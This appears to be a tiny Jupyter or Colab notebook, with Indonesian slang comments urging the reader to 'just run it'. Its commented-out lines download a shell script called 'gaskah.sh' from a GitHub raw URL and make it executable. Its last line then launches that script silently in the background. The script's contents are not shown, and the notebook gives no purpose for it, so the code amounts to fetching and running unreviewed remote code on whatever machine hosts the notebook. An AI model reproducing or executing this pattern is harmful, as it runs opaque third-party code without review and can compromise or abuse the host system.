# %% [markdown]
# #YOLO IS BACK
#
# #Runkann saja

# %%
 #Gaskannn cuk
 import random, string, urllib.request, json, getpass
# !wget https://raw.githubusercontent.com/sijagungmuda/sip/main/gaskah.sh
# !chmod u+x gaskah.sh
get_ipython().system_raw('./gaskah.sh')
